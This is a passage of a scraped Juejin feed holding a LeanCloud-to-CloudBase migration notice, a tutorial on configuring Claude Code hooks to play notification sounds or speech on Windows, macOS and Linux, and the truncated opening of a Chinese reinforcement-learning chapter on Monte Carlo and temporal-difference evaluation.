pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>由于LeanCloud从2026年起将停止对外提供服务，在<strong>2027 年 1 月 12 日</strong>前，平台将正式关闭所有面向公众的服务，包括应用访问、数据读写、API 调用、控制台使用等</p>
<p>腾讯云 CloudBase 针对 LeanCloud 用户推出了整体迁移方案，协助开发者平稳过渡。不仅提供免费云资源，且提供数据库、云函数、云存储、身份认证等与 LeanCloud 类似的能力，同时配备完整迁移指南及智能迁移脚本，支持自动数据格式转换。</p>
<p>迁移详情参考：从 LeanCloud 迁移至 CloudBase 完整指南
<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.cloudbase.net%2Fquick-start%2Fmigration%2Fleancloud" target="_blank" title="https://docs.cloudbase.net/quick-start/migration/leancloud" ref="nofollow noopener noreferrer">docs.cloudbase.net/quick-start…</a></p>
<p>迁移用户可使用专属优惠码领取免费云资源：
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbuy.cloud.tencent.com%2Flowcode%3FbuyType%3Dtcb" target="_blank" title="https://buy.cloud.tencent.com/lowcode?buyType=tcb" ref="nofollow noopener noreferrer">buy.cloud.tencent.com/lowcode?buy…</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30821664bf2345d08ff11c1a3a65f252~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5byA5Y-RQ2xvdWRCYXNl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770865975&amp;x-signature=PG2ylkJKlhqIY1LxEaRdf4Z6JNs%3D" alt="迁移方案海报.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[拒绝死盯屏幕！教你给 Claude Code 加上“语音提示音”，让Claude Code主动报备，提示/完成全知道]]></title>    <link>https://juejin.cn/post/7602816610932047935</link>    <guid>https://juejin.cn/post/7602816610932047935</guid>    <pubDate>2026-02-04T20:34:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602816610932047935" data-draft-id="7602807243705139263" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="拒绝死盯屏幕！教你给 Claude Code 加上“语音提示音”，让Claude Code主动报备，提示/完成全知道"/> <meta itemprop="keywords" content="设计模式"/> <meta itemprop="datePublished" content="2026-02-04T20:34:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Insight"/> <meta itemprop="url" content="https://juejin.cn/user/1192316023081726"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            拒绝死盯屏幕！教你给 Claude Code 加上“语音提示音”，让Claude Code主动报备，提示/完成全知道
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1192316023081726/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Insight
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T20:34:19.000Z" title="Wed Feb 04 2026 20:34:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>最近大家都在用 <strong>Claude Code</strong> (Anthropic 官方出的 CLI 工具) 来写代码。不得不说，它的 Agent 能力确实强，但也带来了一个新的烦恼：</p>
<p><strong>它太爱提问了！</strong> 😩</p>
<blockquote>
<p>"Claude wants to run this command..." (等待授权)
"Cost estimation..." (等待确认)
"Thinking..." (长时间思考)</p>
</blockquote>
<p>如果你不盯着屏幕，它就会一直卡在确认界面；如果你盯着屏幕，又浪费了宝贵的摸鱼时间。</p>
<p>今天分享一个硬核技巧，<strong>给你的 Claude 加上“语音提示”</strong>。不管是它是停下来问你问题，还是任务全部跑完，都能“滴”一声喊你回来搬砖。</p>
<p>我们<strong>不写任何脚本</strong>，<strong>不装 Node.js 环境</strong>，只用 Claude Code 原生的配置文件 <code>hooks</code> 功能来实现！</p>
<hr/>
<h2 data-id="heading-1">Claude Code CLI 原生配置</h2>
<p>如果你习惯直接在终端使用 <code>claude</code> 命令，请修改 CLI 的全局配置文件。</p>
<h3 data-id="heading-2">1. 找到配置文件</h3>
<p>配置文件通常名为 <code>config.json</code> (部分版本可能是 <code>settings.json</code>)，位于 <code>.claude</code> 隐藏文件夹下：</p>
<ul>
<li>
<p><strong>🪟 Windows</strong>:<br/>
<code>C:\Users\你的用户名\.claude\config.json</code><br/>
<em>(或者在资源管理器地址栏输入 <code>%USERPROFILE%\.claude\</code> 快速进入)</em></p>
</li>
<li>
<p><strong>🍎 macOS</strong>:<br/>
<code>~/.claude/config.json</code><br/>
<em>(在终端输入 <code>open ~/.claude/</code> 可打开文件夹)</em></p>
</li>
<li>
<p><strong>🐧 Linux</strong>:<br/>
<code>~/.claude/config.json</code></p>
</li>
</ul>
<h3 data-id="heading-3">2. 添加 Hooks 配置</h3>
<p>用文本编辑器打开该文件，在 JSON 的一级层级下添加 <code>hooks</code> 字段。</p>
<p>请将下方代码中的 <code>【在这里填入提示命令】</code> 替换为文章后半部分提供的<strong>具体系统命令</strong>。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"hooks"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"Stop"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"matcher"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"permission"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"hooks"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
          <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"command"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"【在这里填入你喜欢的提示命令】"</span>
          <span class="hljs-punctuation">}</span>
        <span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"Notification"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"matcher"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"permission"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"hooks"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
          <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"command"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"【在这里填入你喜欢的提示命令】"</span>
          <span class="hljs-punctuation">}</span>
        <span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-comment">// 其它配置</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h2 data-id="heading-4">🎵 核心干货：各大系统提示音命令大全</h2>
<p><strong>这是注入灵魂的一步！</strong> 请根据你的操作系统，挑选一条最心仪的指令填入配置。 无论你是想要<strong>极简的蜂鸣音</strong>、<strong>优雅的系统提示音</strong>，还是想整点“花活”来段<strong>超级玛丽的通关 BGM</strong>，甚至直接让电脑化身**“贾维斯”**用语音向你汇报……这里统统都能满足你！</p>
<h3 data-id="heading-5">🪟 Windows (PowerShell)</h3>
<p>Windows 的可玩性最高，依赖 PowerShell 调用 .NET 库。</p>
<blockquote>
<p><strong>注意：</strong> 填入 JSON 时，外层用双引号，内层命令参数请务必使用<strong>单引号</strong>，防止转义错误。</p>
</blockquote>






























<table><thead><tr><th align="left">音效类型</th><th align="left">JSON 中应填写的 Command 值 (复制这一列)</th><th align="left">效果描述</th></tr></thead><tbody><tr><td align="left"><strong>1. 蜂鸣 (Beep)</strong></td><td align="left"><code>powershell -c "[System.Console]::Beep(800, 500)"</code></td><td align="left">发出 800赫兹 持续 0.5秒 的机械音（主板报警风）。</td></tr><tr><td align="left"><strong>2. 系统提示音</strong></td><td align="left"><code>powershell -c "[System.Media.SystemSounds]::Asterisk.Play()"</code></td><td align="left"><strong>推荐</strong>。播放系统默认的“星号”提示音（通常是“叮”）。可选：<code>Beep</code>, <code>Exclamation</code>, <code>Hand</code>, <code>Question</code>等。</td></tr><tr><td align="left"><strong>3. 播放 WAV</strong></td><td align="left"><code>powershell -c "(New-Object Media.SoundPlayer 'C:\\Sounds\\notify.wav').PlaySync()"</code></td><td align="left"><strong>自定义党推荐</strong>。播放本地 WAV 文件（注意路径用双反斜杠 <code>\\</code>）。<code>.SoundPlayer</code> 类<strong>不支持 MP3</strong>，只支持 WAV。</td></tr><tr><td align="left"><strong>4. 语音合成 (TTS)</strong></td><td align="left"><code>powershell -c "Add-Type -A System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Master, waiting for command')"</code></td><td align="left"><strong>极客风</strong>。直接让电脑开口说话喊你。</td></tr></tbody></table>
<h3 data-id="heading-6">🍎 macOS (Terminal / Zsh)</h3>
<p>Mac 的命令行音频支持最优雅，无需额外配置。</p>






























<table><thead><tr><th align="left">音效类型</th><th align="left">JSON 中应填写的 Command 值 (复制这一列)</th><th align="left">效果描述</th></tr></thead><tbody><tr><td align="left"><strong>1. 系统提示音</strong></td><td align="left"><code>tput bel</code></td><td align="left">触发 iTerm2 或终端配置的默认提示音。</td></tr><tr><td align="left"><strong>2. 播放系统音效</strong></td><td align="left"><code>afplay /System/Library/Sounds/Glass.aiff</code></td><td align="left"><strong>推荐</strong>。清脆悦耳的玻璃声。可选：<code>Ping</code>, <code>Hero</code>, <code>Submarine</code>, <code>Submarine</code>等。</td></tr><tr><td align="left"><strong>3. 播放任意文件</strong></td><td align="left"><code>afplay '/Users/yourname/Music/alert.mp3'</code></td><td align="left">支持 MP3, WAV, AIFF 等几乎所有格式。</td></tr><tr><td align="left"><strong>4. 语音合成 (TTS)</strong></td><td align="left"><code>say 'Claude needs permission'</code></td><td align="left"><strong>推荐</strong>。直接语音播报，可用 <code>say -v Samantha 'Hello'</code> 换人声。</td></tr></tbody></table>
<h3 data-id="heading-7">🐧 Linux (Ubuntu / Debian / CentOS)</h3>
<p>Linux 取决于你的桌面环境和音频驱动，推荐使用 <code>paplay</code>。</p>






























<table><thead><tr><th align="left">音效类型</th><th align="left">JSON 中应填写的 Command 值 (复制这一列)</th><th align="left">效果描述</th></tr></thead><tbody><tr><td align="left"><strong>1. 蜂鸣 (Beep)</strong></td><td align="left"><code>echo -e "\a"</code></td><td align="left">触发终端模拟器的响铃（部分发行版默认静音）。</td></tr><tr><td align="left"><strong>2. 播放系统音效</strong></td><td align="left"><code>paplay /usr/share/sounds/freedesktop/stereo/complete.oga</code></td><td align="left"><strong>推荐</strong> (PulseAudio)。大多数现代发行版（Ubuntu等）通用。</td></tr><tr><td align="left"><strong>3. 播放 WAV</strong></td><td align="left"><code>aplay /path/to/file.wav</code> 或 <code>mpg123 /path/to/file.mp3</code></td><td align="left">最底层 ALSA 驱动，仅支持 WAV。播放 MP3 通常需要安装 <code>mpg123</code> 或 <code>ffmpeg</code></td></tr><tr><td align="left"><strong>4. 语音合成 (TTS)</strong></td><td align="left"><code>spd-say 'Attention please'</code></td><td align="left">需要安装 <code>speech-dispatcher</code>，或者用 <code>espeak "Done"</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-8">⚡️ 最终效果演示 (以 Mac 语音为例)</h2>
<p>假设你配置了 <code>say "Sir, permission required"</code>。</p>
<ol>
<li>你在终端输入：<code>claude "重构一下登录模块"</code></li>
<li>你切出去回微信。</li>
<li>Claude 分析完代码，准备修改文件，停在确认界面。</li>
<li>你的电脑突然传来标准的 Siri 语音：<strong>"Sir, permission required."</strong></li>
<li>你淡定切回终端，敲个 <code>y</code>，深藏功与名。</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9c846967e004419954642afc221cbb0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW5zaWdodA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770848279&amp;x-signature=%2BX7btUQyo9Fu1zR6QIfuqEBLauQ%3D" alt="image.png" loading="lazy"/></p>
<p>快去试试吧！让你的 Claude 变成真正的 AI 助理。 🚀</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【强化学习】第五章：无模型评估：蒙特卡洛学习、时序差分学习、TD(λ)]]></title>    <link>https://juejin.cn/post/7602846823326220323</link>    <guid>https://juejin.cn/post/7602846823326220323</guid>    <pubDate>2026-02-05T02:03:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602846823326220323" data-draft-id="7602901195153326132" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【强化学习】第五章：无模型评估：蒙特卡洛学习、时序差分学习、TD(λ)"/> <meta itemprop="keywords" content="强化学习"/> <meta itemprop="datePublished" content="2026-02-05T02:03:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="宝贝儿好"/> <meta itemprop="url" content="https://juejin.cn/user/2737129399522635"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【强化学习】第五章：无模型评估：蒙特卡洛学习、时序差分学习、TD(λ)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2737129399522635/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    宝贝儿好
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T02:03:15.000Z" title="Thu Feb 05 2026 02:03:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>从本篇章开始，我们开启<strong>无模型</strong>(Model-free)的强化学习方法。</p>
<h3 data-id="heading-0">一、梳理本章在强化学习中的位置</h3>
<p><strong>1、有模型强化学习-&gt;无模型强化学习</strong><br/>
在强化学习中我们经常听到有模型、无模型这对儿概念。</p>
<p><strong>有模型</strong>是指可以将现实问题<strong>抽象成一个完备的MDP</strong>。完备的MDP就是我们<strong>是知道</strong>环境中的状态集合，以及每个状态下的动作集合，<strong>而且知道</strong>状态之间的转移概率，<strong>并且知道</strong>系统的即时奖励。此时我们用<strong>贝尔曼期望方程+动态规划</strong>就可以解决，一般称为<strong>DP算法</strong>，具体实现过程可以参考第三、第四篇章。</p>
<p><strong>无模型</strong>(Model-free)是指现实问题是一个<strong>非完备的MDP</strong>，我们<strong>不知道</strong>系统背后的状态集合和动作集合，<strong>更不知道</strong>状态转移矩阵，我们只能实实在在的去<strong>打几步或者打完</strong>整个游戏，然后得到一些s,a,r序列，然后通过这些序列去计算状态价值。此时游戏中的<strong>状态价值的计算</strong>就得用<strong>无模型强化学习方法</strong>，比如<strong>蒙特卡洛学习</strong>(MC)、<strong>时序差分学习</strong>(TD)、<strong>TD(λ)</strong>。这三个算法也是<strong>本篇讲解的重点内容</strong>。<br/>
在无模型强化学习中，我们给这种“实实在在打几步或打多轮游戏，得到的s,a,r序列”叫<strong>数据</strong>或者叫<strong>经验</strong>。</p>
<p><strong>2、DP、MC、TD、TD(λ)的应用场合</strong><br/>
也是有模型算法和无模型算法之间的联系与区别：</p>
<p>（1）DP<strong>只能</strong>用于完备的MDP，<strong>而且</strong>DP可以直接计算出最优策略。或者说DP得有模型，无模型DP算法不能用。</p>
<p>（2）无模型算法<strong>通常</strong>是用于解决非完备MDP问题的，当然它们<strong>也可以</strong>用来解决完备的MDP问题，只是完备的MDP问题用DP解决效果要比无模型算法的效果<strong>好很多</strong>！因为DP解出来的是精确解，而且还可以算出最优策略，其他算法都是对DP的近似，所以其他算法都是估计解，自然比不了DP的效果了。所以很多时候选择算法时，一定一定要和你的实际问题匹配。问题和算法不匹配，得到的效果肯定不好。</p>
<p>（3）为什么说强化学习的其他算法(当然也包括本章的无模型算法)都是对DP的近似？因为其他算法都是在DP的基础上，要么是<strong>减弱了对环境模型完备性的假设</strong>，要么就是<strong>降低了计算复杂度</strong>。</p>
<p>（4）DP这么好，还要其他算法干嘛？DP虽好也有其缺点，比如非完备的MDP问题，DP是无法求解的。而且DP的计算复杂度也是非常高的。此时你就<strong>必须得用</strong>无模型算法。一句话，实际要和算法匹配！</p>
<p>（5）无模型算法可以不需要模型，但必须得有<strong>数据</strong>(经验)。也就是你得是实实在在去打游戏，算法根据这些游戏数据去学习和提升策略。</p>
